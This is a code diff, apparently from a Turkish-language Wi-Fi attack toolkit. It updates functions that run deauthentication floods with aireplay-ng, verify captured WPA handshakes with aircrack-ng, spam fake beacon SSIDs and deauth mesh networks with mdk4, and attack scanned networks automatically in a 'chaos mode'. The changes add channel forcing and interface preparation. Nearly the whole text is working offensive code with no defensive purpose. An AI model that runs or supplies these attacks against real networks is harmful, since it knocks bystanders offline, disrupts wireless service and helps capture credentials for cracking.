@@ -6,14 +6,27 @@ import time
 from modules import radar, engine, i18n
 t = i18n.t
 
-
 # --- DEAUTH ATTACK (Ağdan Düşürme Saldırısı) ---
-def pulse_kick(iface, bssid, client=None, timer=0):
+def pulse_kick(iface, bssid, client=None, timer=0, channel=None):
+    if os.path.exists("/usr/bin/nmcli"):
+        subprocess.run(["sudo", "nmcli", "device", "set", iface, "autoconnect", "no"], capture_output=True)
+        subprocess.run(["sudo", "nmcli", "device", "disconnect", iface], capture_output=True)
+        subprocess.run(["sudo", "nmcli", "device", "set", iface, "managed", "no"], capture_output=True)
+        time.sleep(1) 
+        
+    if channel:
+        subprocess.run(["sudo", "ip", "link", "set", iface, "up"], capture_output=True)
+        subprocess.run(["sudo", "iwconfig", iface, "channel", str(channel)], capture_output=True)
+        subprocess.run(["sudo", "iw", "dev", iface, "set", "channel", str(channel)], capture_output=True)
+        time.sleep(1)
+        
     val_timer = t("strike_pulse_kick_unlimited") if timer == 0 else f"{timer} sn"
     print(t("strike_pulse_kick_start", bssid=bssid, timer=val_timer))
-    cmd = ["sudo", "aireplay-ng", "-0", "0", "-a", bssid]
+    
+    cmd = ["sudo", "aireplay-ng", "--ignore-negative-one", "-0", "0", "-a", bssid]
     if client: cmd.extend(["-c", client])
     cmd.append(iface)
+    
     try:
         if timer > 0:
             subprocess.run(cmd, timeout=timer)
@@ -25,7 +38,6 @@ def pulse_kick(iface, bssid, client=None, timer=0):
     except KeyboardInterrupt:
         print(t("strike_cancel"))
 
-
 def verify_handshake(cap_file):
     print(t("strike_handshake_check", cap_file=cap_file))
     cmd = ["sudo", "aircrack-ng", cap_file]
@@ -36,7 +48,6 @@ def verify_handshake(cap_file):
     else:
         print(t("strike_handshake_fail"))
         return False
-
 
 # --- BEACON SPAM (Sahte Ağ Yayma) ---
 def beacon_spam(iface):
@@ -64,25 +75,28 @@ def beacon_spam(iface):
                 ssids.append(clean_name)
         else:
             print(t("strike_beacon_standard_load"))
-            ssids = [
-                t("troll_1"), 
-                t("troll_2"), 
-                t("troll_3"), 
-                t("troll_4"), 
-                t("troll_5")
-            ]
+            ssids = [t("troll_1"), t("troll_2"), t("troll_3"), t("troll_4"), t("troll_5")]
         with open(spam_file, "w") as f:
             for isim in ssids:
                 f.write(radar.clean_ssid(isim) + "\n")
+                
+    # YENİ EKLENEN: 5GHz / 2.4GHz MDK4 Kanal Zorlaması
+    print("\n    [1] Varsayılan (Hopping - Hızlı)")
+    print("    [2] Belirli Bir Kanalda Yay (Örn: 40 veya 11)")
+    kanal_secim = input("    Kanal: ")
+    
     print(t("strike_beacon_start"))
     try:
-        cmd = ["sudo", "mdk3", iface, "b", "-f", spam_file, "-a", "-s", "1000"]
+        cmd = ["sudo", "mdk4", iface, "b", "-f", spam_file, "-s", "1000"]
+        if kanal_secim == "2":
+            k_no = input("    Kanal Numarası: ")
+            cmd.extend(["-c", str(k_no)])
+            
         subprocess.run(cmd)
     except KeyboardInterrupt:
         print(t("strike_beacon_stop"))
     except Exception:
         print(t("strike_beacon_error"))
-
 
 # --- CHAOS MODE (Kaos Modu) ---
 def chaos_mode(iface):
@@ -90,7 +104,8 @@ def chaos_mode(iface):
     print(t("strike_chaos_scanning"))
     time.sleep(2)
     try:
-        networks = radar.auto_scan_and_select(iface, scan_time=10)
+        # Arkaplan taraması interactive=False ile çalışır, her yeri tarar
+        networks = radar.auto_scan_and_select(iface, scan_time=10, interactive=False)
         if not networks:
             print(t("strike_chaos_no_nets"))
             return
@@ -109,14 +124,15 @@ def chaos_mode(iface):
     except KeyboardInterrupt:
         print(t("strike_chaos_stop"))
 
-
 # --- MESH KILLER (SSID-Based Attack) ---
-def mesh_strike(iface, ssid):
+def mesh_strike(iface, ssid, channel=None):
+    # Kanal parametresi eklendi
     ssid = radar.clean_ssid(ssid)
     print(t("strike_mesh_start", ssid=ssid))
     try:
-
-        cmd = ["sudo", "mdk3", iface, "d", "-n", ssid]
+        cmd = ["sudo", "mdk4", iface, "d", "-n", ssid]
+        if channel:
+            cmd.extend(["-c", str(channel)])
         subprocess.run(cmd)
     except KeyboardInterrupt:
         print(t("strike_mesh_stop", ssid=ssid))
